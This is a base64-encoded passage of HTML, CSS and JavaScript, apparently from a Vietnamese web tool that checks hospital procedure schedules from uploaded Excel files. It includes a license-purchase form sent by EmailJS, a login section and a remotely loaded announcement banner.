m4gTG9uZyBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBLacOqbiBMb25nPC9vcHRpb24+DQogIDxvcHRpb24+VmlldENhcGl0YWxCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBC4bqjbiBWaeG7h3Q8L29wdGlvbj4NCiAgPG9wdGlvbj5OQ0IgLSBOZ8OibiBow6BuZyBUTUNQIFF14buRYyBEw6JuPC9vcHRpb24+DQogIDxvcHRpb24+TFBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBCxrB1IMSRaeG7h24gTGnDqm4gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+UEcgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgWMSDbmcgZOG6p3UgUGV0cm9saW1leDwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBWaeG7h3QgTmFtIFRoxrDGoW5nIFTDrW48L29wdGlvbj4NCiAgPG9wdGlvbj5TYWlnb25CYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBTw6BpIEfDsm4gQ8O0bmcgVGjGsMahbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5DTy1PUCBCYW5rIC0gTmfDom4gaMOgbmcgSOG7o3AgdMOhYyB4w6MgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlB1YmxpYyBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5TaGluaGFuIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPldvb3JpIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlVPQiBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+U3RhbmRhcmQgQ2hhcnRlcmVkIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkhvbmcgTGVvbmcgQmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+SFNCQyBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+Q0lNQiBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5DaXRpYmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+QU5aIFZpZXRuYW08L29wdGlvbj4NCjwvc2VsZWN0Pjxici8+DQoNCjxsYWJlbD5Uw6puIHTDoGkga2hv4bqjbiBuZ8aw4budaSBtdWE6PC9sYWJlbD4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iYnV5ZXJOYW1lIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlTDqm4gYuG7h25oIHZp4buHbiAvIHBow7JuZyBraMOhbTo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJob3NwaXRhbCIgcmVxdWlyZWQ+PGJyLz4NCiAgICAgIDxsYWJlbD5HbWFpbCBjw6EgbmjDom4gaG/hurdjIMSRxqFuIHbhu4s8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBpZD0iYnV5ZXJNYWlsIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlPhu5EgxJFp4buHbiB0aG/huqFpOjwvbGFiZWw+DQogICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImJ1eWVyUGhvbmUiIHJlcXVpcmVkPjxici8+PGJyLz4NCiAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV5LWJ0biI+R+G7rWk8L2J1dHRvbj4NCiAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZVBheW1lbnQoKSI+SOG7p3k8L2J1dHRvbj4NCiAgICA8L2Zvcm0+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCjwhLS0gUE9QVVAgWMOBQyBOSOG6rE4gR+G7rEkgLS0+DQo8ZGl2IGlkPSJjb25maXJtUG9wdXAiIGNsYXNzPSJwb3B1cC1vdmVybGF5IiBzdHlsZT0iZGlzcGxheTpub25lOyI+DQogIDxkaXYgY2xhc3M9InBvcHVwLWNvbnRlbnQgY29uZmlybS1wb3B1cCI+DQogICAgPGgzPuKchSDEkMOjIGfhu61pIHThu5tpIGLhu5kgcGjhuq1uIHRp4bq/cCBuaOG6rW4uPC9oMz4NCiAgICA8cD5WdWkgbMOybmcgxJHhu6NpIGvhur90IHF14bqjIHjDoWMgbmjhuq1uIHThu6sgYuG7mSBwaOG6rW4ga+G7uSB0aHXhuq10LjwvcD4NCiAgICA8YnV0dG9uIGNsYXNzPSJjbG9zZS1idG4iIG9uY2xpY2s9ImNsb3NlQ29uZmlybSgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCjxzdHlsZT4NCi5mb3JtLXBvcHVwIHsNCiAgbWF4LWhlaWdodDogODB2aDsgICAgICAgICAgIC8qIGNoaeG6v20gdOG7kWkgxJFhIDgwJSBjaGnhu4F1IGNhbyBtw6BuIGjDrG5oICovDQogIG92ZXJmbG93LXk6IGF1dG87ICAgICAgICAgICAvKiBu4bq/dSBu4buZaSBkdW5nIGTDoGkgdGjDrCBjdeG7mW4gKi8NCiAgcGFkZGluZy1yaWdodDogMTVweDsgICAgICAgIC8qIHRyw6FuaCBj4bqvdCBjaOG7ryBraGkgY3Xhu5luICovDQogIHNjcm9sbGJhci13aWR0aDogdGhpbjsgICAgICAvKiB0aGFuaCBjdeG7mW4gbeG6o25oICovDQogIHNjcm9sbGJhci1jb2xvcjogZ29sZCB0cmFuc3BhcmVudDsNCn0NCg0KLyogbMOgbSDEkeG6uXAgdGhhbmggY3Xhu5luIHRyw6puIENocm9tZSwgRWRnZSwgU2FmYXJpICovDQouZm9ybS1wb3B1cDo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICB3aWR0aDogNnB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogZ29sZDsNCiAgYm9yZGVyLXJhZGl1czogNHB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQp9DQoucG9wdXAtb3ZlcmxheSB7DQogIHBvc2l0aW9uOiBmaXhlZDsNCiAgaW5zZXQ6IDA7DQogIGJhY2tncm91bmQ6IHJnYmEoMCwwLDAsMC42KTsNCiAgZGlzcGxheTogZmxleDsNCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogIHotaW5kZXg6IDk5OTk7DQogIGFuaW1hdGlvbjogZmFkZUluIDAuM3MgZWFzZTsNCn0NCg0KLnBvcHVwLWNvbnRlbnQgew0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KICBwYWRkaW5nOiAzMHB4Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCByZ2JhKDAsMCwwLDAuMyk7DQogIGFuaW1hdGlvbjogem9vbUluIDAuM3MgZWFzZTsNCn0NCi5wb3B1cC1jb250ZW50IHsNCiAgbWF4LXdpZHRoOiA3MDBweDsNCiAgd2lkdGg6IDkwJTsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCg0KLmx1eHVyeSB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxMTEsICMyMjIpOw0KICBjb2xvcjogI2ZmZjsNCiAgbWF4LXdpZHRoOiA4MDBweDsNCn0NCg0KLnBvcHVwLXRpdGxlIHsNCiAgZm9udC1zaXplOiAyNHB4Ow0KICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KICBjb2xvcjogZ29sZDsNCiAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4IGdvbGQ7DQp9DQoNCi5wcmljaW5nLWdyaWQgew0KICBkaXNwbGF5OiBmbGV4Ow0KICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7DQogIGdhcDogMjVweDsNCiAgZmxleC13cmFwOiB3cmFwOyAvKiDEkeG7gyByZXNwb25zaXZlIGtoaSBtw6BuIGjDrG5oIG5o4buPICovDQogIG1hcmdpbi10b3A6IDIwcHg7DQp9DQoNCi5wcmljZS1jYXJkIHsNCiAgZmxleDogMSAxIDE4MHB4Ow0KICBtYXgtd2lkdGg6IDIwMHB4Ow0KICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwyNTUsMjU1LDAuMDgpOw0KICBib3JkZXI6IDJweCBzb2xpZCBnb2xkOw0KICBib3JkZXItcmFkaXVzOiAxOHB4Ow0KICBwYWRkaW5nOiAyMHB4IDE1cHg7DQogIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCg0KLnByaWNlLWNhcmQ6aG92ZXIgew0KICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTEwcHgpIHNjYWxlKDEuMDUpOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCBnb2xkOw0KfQ0KDQoucHJpY2UtY2FyZCBoMyB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmY7DQogIG1hcmdpbi1ib3R0b206IDEwcHg7DQogIHRleHQtc2hhZG93OiAwIDAgNXB4IGdvbGQ7DQp9DQoNCi5wcmljZS1jYXJkIC5wcmljZSB7DQogIGZvbnQtc2l6ZTogMThweDsNCiAgY29sb3I6ICNmZmViM2I7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICBtYXJnaW4tYm90dG9tOiAxNXB4Ow0KfQ0KDQoNCi5wcmljZSB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmViM2I7DQp9DQoNCi5idXktYnRuIHsNCiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCBnb2xkLCAjZjM5YzEyKTsNCiAgY29sb3I6ICMwMDA7DQogIGJvcmRlcjogbm9uZTsNCiAgYm9yZGVyLXJhZGl1czogMTJweDsNCiAgcGFkZGluZzogMTBweCAyMHB4Ow0KICBjdXJzb3I6IHBvaW50ZXI7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICB0cmFuc2l0aW9uOiAwLjNzOw0KfQ0KDQouYnV5LWJ0bjpob3ZlciB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgI2ZmZDcwMCwgI2ZmYTUwMCk7DQp9DQoNCi5jbG9zZS1idG4gew0KICBtYXJnaW4tdG9wOiAyMHB4Ow0KICBiYWNrZ3JvdW5kOiAjZTc0YzNjOw0KICBjb2xvcjogI2ZmZjsNCiAgYm9yZGVyOiBub25lOw0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICBwYWRkaW5nOiAxMHB4IDIwcHg7DQogIGN1cnNvcjogcG9pbnRlcjsNCn0NCg0KQGtleWZyYW1lcyBmYWRlSW4gew0KICBmcm9tIHsgb3BhY2l0eTogMDsgfSB0byB7IG9wYWNpdHk6IDE7IH0NCn0NCg0KQGtleWZyYW1lcyB6b29tSW4gew0KICBmcm9tIHsgdHJhbnNmb3JtOiBzY2FsZSgwLjkpOyBvcGFjaXR5OiAwOyB9IHRvIHsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgb3BhY2l0eTogMTsgfQ0KfQ0KDQouZm9ybS1wb3B1cCBpbnB1dCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KfQ0KDQouY29uZmlybS1wb3B1cCB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICM0Q0FGNTAsICMyRTdEMzIpOw0KICBjb2xvcjogI2ZmZjsNCiAgcGFkZGluZzogMjVweCA0MHB4Ow0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KfS5mb3JtLXBvcHVwIHNlbGVjdCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KfQ0KPC9zdHlsZT48c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsICgpID0+IHsNCiAgY29uc3QgYnV5QnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eSIpOw0KICBpZiAoYnV5QnRuKSB7DQogICAgYnV5QnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICB9KTsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQnV5UG9wdXAoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQoNCmZ1bmN0aW9uIG9wZW5QYXltZW50KHBlcmlvZCwgcHJpY2UpIHsNCiAgY2xvc2VCdXlQb3B1cCgpOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudFBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1vbmV5IikudmFsdWUgPSBgJHtwcmljZX0gKCR7cGVyaW9kfSlgOw0KfQ0KDQpmdW5jdGlvbiBjbG9zZVBheW1lbnQoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KfQ0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudEZvcm0iKS5hZGRFdmVudExpc3RlbmVyKCJzdWJtaXQiLCBhc3luYyAoZSkgPT4gew0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogIGNvbnN0IGZvcm1EYXRhID0gew0KICAgIGFjYzogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyQWNjIikudmFsdWUsDQoJICBiYW5rOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJCYW5rIikudmFsdWUsDQogICAgbmFtZTogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyTmFtZSIpLnZhbHVlLA0KICAgIGhvc3BpdGFsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaG9zcGl0YWwiKS52YWx1ZSwNCiAgICBtYWlsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJNYWlsIikudmFsdWUsDQogICAgcGhvbmU6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXllclBob25lIikudmFsdWUsDQogICAgbW9uZXk6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtb25leSIpLnZhbHVlDQogIH07DQoNCiAgdHJ5IHsNCmVtYWlsanMuc2VuZCgic2VydmljZV9wZ29ia3E3IiwgInRlbXBsYXRlX200dWU4NWMiLCBmb3JtRGF0YSkNCiAgLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2UpIHsNCiAgICBjb25zb2xlLmxvZygiR+G7rWkgdGjDoG5oIGPDtG5nOiIsIHJlc3BvbnNlLnN0YXR1cywgcmVzcG9uc2UudGV4dCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBheW1lbnRQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIH0sIGZ1bmN0aW9uKGVycm9yKSB7DQogICAgY29uc29sZS5lcnJvcigiTOG7l2kgRW1haWxKUzoiLCBlcnJvcik7DQogIH0pOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb25maXJtUG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICB9IGNhdGNoIHsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQ29uZmlybSgpIHsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQo8L3NjcmlwdD4NCg0KDQo8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KPGRpdiBjbGFzcz0ibG9naW4tc2VjdGlvbiIgaWQ9ImxvZ2luU2VjdGlvbiI+DQo8aDIgY2xhc3M9ImxvZ2luLXRpdGxlIj7EkMSCTkcgTkjhuqxQIEjhu4YgVEjhu5BORzwvaDI+DQo8aW5wdXQgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0idXNlcm5hbWVJbnB1dCIgcGxhY2Vob2xkZXI9IlTDqm4gxJHEg25nIG5o4bqtcCIgdHlwZT0idGV4dCIvPg0KPGlucHV0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9InBhc3N3b3JkSW5wdXQiIHBsYWNlaG9sZGVyPSJN4bqtdCBraOG6qXUiIHR5cGU9InBhc3N3b3JkIi8+DQo8YnIvPjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImxvZ2luQnRuIj7EkMSDbmcgbmjhuq1wPC9idXR0b24+DQo8ZGl2IGNsYXNzPSJsb2dpbi1lcnJvciIgaWQ9ImxvZ2luRXJyb3IiPlTDqm4gxJHEg25nIG5o4bqtcCBob+G6t2MgbeG6rXQga2jhuql1IGtow7RuZyDEkcO6bmc8L2Rpdj4NCjxici8+PGJyLz48aHIvPjxici8+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5Ij5NdWEgVMOgaSBLaG/huqNuIC0gS8OtY2ggSG/huqF0IELhuqNuIFF1eeG7gW48L2J1dHRvbj4NCg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiIGlkPSJtYWluQ29udGVudCI+DQo8ZGl2IGNsYXNzPSJ0b3AtYnV0dG9uLWdyb3VwIj48YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJidXkiPk11YSBC4bqjbiBRdXnhu4FuPC9idXR0b24+DQogIDxidXR0b24gb25jbGljaz0ib3BlbkN1c3RvbWl6ZVBhbmVsKCkiIGNsYXNzPSJidG4iPlR14buzIGJp4bq/bjwvYnV0dG9uPg0KDQoNCg0KPGJ1dHRvbiBvbmNsaWNrPSJzaG93RHJvcGJveFBhbmVsKCkiIGNsYXNzPSJidG4iPlBhbmVsPC9idXR0b24+DQoNCiAgPGJ1dHRvbiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7IiBjbGFzcz0iYnRuIj5Yb8OhIENhY2hlPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biJpZD0ibG9nb3V0QnRuIj7EkMSDbmcgeHXhuqV0PC9idXR0b24+DQo8L2Rpdj4NCg0KDQo8aDE+IDxhIGhyZWY9Imh0dHBzOi8vZmIuY29tL2NoYXVodXluaDAxMDQiIHN0eWxlPSJhbGw6IHVuc2V0OyBjdXJzb3I6IHBvaW50ZXI7IiB0YXJnZXQ9Il9ibGFuayI+S2nhu4NtIFRyYSBUaOG7pyBUaHXhuq10PC9hPjwvaDE+DQo8ZGl2IGNsYXNzPSJsaXN0MSIgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGdhcDogOHB4OyI+DQo8aSBjbGFzcz0iZmEgZmEtYnVsbGhvcm4iPjwvaT4NCjxiPjxmb250IGNvbG9yPSJyZWQiPlRow7RuZyBiw6FvOjwvZm9udD48L2I+DQo8ZGl2IGNsYXNzPSJzY3JvbGxpbmctdGV4dCIgc3R5bGU9ImZsZXg6IDE7IG92ZXJmbG93OiBoaWRkZW47Ij4NCjxkaXYgY2xhc3M9InNjcm9sbGluZy1jb250ZW50IiBpZD0ibm9pZHVuZyI+DQoNCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQoNCg0KZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi90aG9uZ2Jhby50eHQnKQ0KICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpDQogIC50aGVuKGRhdGEgPT4gew0KICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaWR1bmcnKTsNCiAgICBlbC5pbm5lckhUTUwgPSBkYXRhOw0KDQogICAgLy8gVMSDbmcgxJHhu5kgZMOgaSBu4buZaSBkdW5nIMSR4buDIMSR4bqjbSBi4bqjbyBjdeG7mW4NCiAgICBlbC5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgZWwuc3R5bGUubWluV2lkdGggPSAnMTAwJSc7DQoNCiAgICAvLyBSZXNldCBhbmltYXRpb24gdG8gZm9yY2UgcmVmbG93DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ25vbmUnOw0KICAgIHZvaWQgZWwub2Zmc2V0V2lkdGg7DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ3Njcm9sbC1sZWZ0IDEwcyBsaW5lYXIgaW5maW5pdGUnOw0KICB9KQ0KICAuY2F0Y2goZXJyb3IgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lkdW5nJykudGV4dENvbnRlbnQgPSAnS2jDtG5nIHRo4buDIHThuqNpIG7hu5lpIGR1bmcuJzsNCiAgICBjb25zb2xlLmVycm9yKGVycm9yKTsNCiAgfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ1cGxvYWQtc2VjdGlvbiI+PGRpdiBjbGFzcz0ibWFpbmJsb2siPg0KDQo8aW5wdXQgYWNjZXB0PSIueGxzeCwgLnhscywgLmNzdiIgaWQ9ImZpbGVJbnB1dCIgc3R5bGU9ImRpc3BsYXk6bm9uZSIgdHlwZT0iZmlsZSIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0idHJpZ2dlckJ1dHRvbiI+PGkgY2xhc3M9ImZhcyBmYS1maWxlLXVwbG9hZCI+PC9pPiBDaOG7jW4gZmlsZSB0aOG7pyBjw7RuZzwvYnV0dG9uPg0KPGJyLz48YnIvPg0KPGlucHV0IGRpcmVjdG9yeT0iIiBpZD0iZm9sZGVySW5wdXQiIG11bHRpcGxlPSIiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIHR5cGU9ImZpbGUiIHdlYmtpdGRpcmVjdG9yeT0iIi8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJmb2xkZXJCdG4iPjxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gQ2jhu41uIHRoxrAgbeG7pWMgKFThu7EgxJHhu5luZyB0w6xtIGZpbGUpPC9idXR0b24+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4O2NvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+PC9kaXY+DQoNCg0KPGxhYmVsPg0KPGlucHV0IG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzowMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MDANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxsYWJlbD4NCjxpbnB1dCBjaGVja2VkPSIiIG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzozMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MzANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxici8+PGJyLz4NCg0KICA8bGFiZWwgc3R5bGU9Im1hcmdpbi1yaWdodDogMTBweDsiPg0KPGlucHV0IGNoZWNrZWQ9IjEiIGlkPSJpZ25vcmVBZGphY2VudENoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPg0KPHNwYW4gY2xhc3M9ImNodS10aGljaCI+QuG7jyBxdWEgdGjhu6cgdGh14bqtdCBsaeG7gW4ga+G7gTxzcGFuIGNsYXNzPSJub2ktZHVuZyI+VkQ6IDhoMDAtOGgzMCB4b2EgYsOzcC4gMDhoMzAtMDhoNTAgxJFp4buHbiBjaMOibS4gbGnDqm4gdGnhur9wIG3DoCBrbyBjw6FjaCAxIHBow7p0IDwvc3Bhbj48L3NwYW4+DQo8L2xhYmVsPg0KDQogIDxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgaWQ9InNob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyA2IGtodW5nIGdp4budIGfhu6NpIMO9ICAgICAgICAgDQogICAgPC9sYWJlbD4NCg0KPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBpZD0ic2hvd0RvY3RvckNoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPiANCiAgICAgICAgSGnhu4NuIHRo4buLIELDoWMgc8SpIGNo4buJIMSR4buLbmgNCiAgICA8L2xhYmVsPjxsYWJlbD4NCiAgPGlucHV0IGlkPSJzaG93SGVyYkVycm9yRGF5c0NoZWNrYm94IiB0eXBlPSJjaGVja2JveCJjaGVja2VkLz4NCiAgQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kNCjwvbGFiZWw+DQo8YnIvPjxici8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJhbmFseXplQnRuIj5LaeG7g20gVHJhPC9idXR0b24+DQoNCg0KDQoNCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBmaWxlID0gdGhpcy5maWxlc1swXTsNCiAgICBpZiAoZmlsZSkgew0KICAgICAgICBjb25zdCBzdGF0dXMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgICAgICBzdGF0dXMuaW5uZXJIVE1MID0gYDxpIGNsYXNzPSJmYXMgZmEtZmlsZSI+PC9pPsSQw6MgY2jhu41uIGZpbGU6IDxiPiR7ZmlsZS5uYW1lfTwvYj5gOw0KICAgICAgICBzdGF0dXMuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN0YXR1cy5zdHlsZS5jb2xvciA9ICcjMmMzZTUwJzsNCiAgICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4OyBjb2xvcjojMmMzZTUwOyBmb250LXdlaWdodDpib2xkOyBkaXNwbGF5OiBub25lOyI+PC9kaXY+DQo8YnIvPg0KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTogMTJweDsiPjxpPlBo4bqnbiBt4buBbSDEkcO0aSBraGkgY8OzIHRo4buDIG3huq9jIGzhu5dpLiBYaW4gaMOjeSBraeG7g20gdHJhIGPDoWMgdGjDtG5nIHRpbiBxdWFuIHRy4buNbmcuPC9pPjwvc3Bhbj4NCjxkaXYgaWQ9ImZpbGVSZXF1aXJlbWVudHMiPjwvZGl2Pg0KPC9kaXY+PC9kaXY+DQoNCg0KPCEtLSBC4bquVCDEkOG6plU6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCiAgPGJ1dHRvbiBpZD0iaGVyYlRvZ2dsZUJ0biIgY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xlSGVyYkxpc3QoKSJzdHlsZT0iZGlzcGxheTpub25lIj5T4bqvYyB0aHXhu5FjIHRoYW5nPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xlQXZhaWxhYmls